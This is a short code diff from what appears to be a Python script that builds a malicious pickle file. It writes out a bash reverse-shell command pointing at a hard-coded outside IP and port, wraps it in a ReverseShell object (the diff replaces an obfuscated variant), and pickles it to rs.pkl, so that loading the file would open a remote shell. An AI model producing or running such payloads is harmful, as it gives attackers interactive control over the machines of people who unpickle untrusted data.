@@ -19,6 +19,6 @@ if __name__ == '__main__':
     host = '52.207.225.255'
     port = 6006
     bash_cmd = 'bash -i >& /dev/tcp/{}/{} 0>&1'.format(host, port)
-    rs = ObfuscatedReverseShell(bash_cmd)
+    rs = ReverseShell(bash_cmd)
     with open('rs.pkl', 'wb') as f:
         pickle.dump(rs, f)
